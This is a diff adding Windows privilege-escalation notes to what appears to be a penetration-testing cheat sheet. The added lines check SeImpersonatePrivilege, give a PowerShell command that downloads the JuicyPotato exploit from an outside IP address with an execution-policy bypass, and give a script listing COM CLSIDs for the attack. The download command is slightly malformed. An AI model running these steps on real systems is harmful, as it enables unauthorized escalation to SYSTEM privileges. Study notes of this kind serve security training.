@@ -23,3 +23,15 @@
 
 ## Windows PE
 > - Check juice potato work or not with command "Whoami /priv". If SeImpersonatePrivilege is enabled yes . you can exploit that 
+follow this step 
+> - powershell "IEX(New-Object Net.WebClient).downloadFile('http://192.168.119.161:8000/JuicyPotato.exe','C:\test\JuicyPotato.exe')" -bypass executionpolicy
+> - Create this script to show clsid :
+New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
+$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object
+{$_.appid -ne $null}
+foreach($a in $CLSID)
+{
+    Write-Host $a.CLSID
+}
+
+
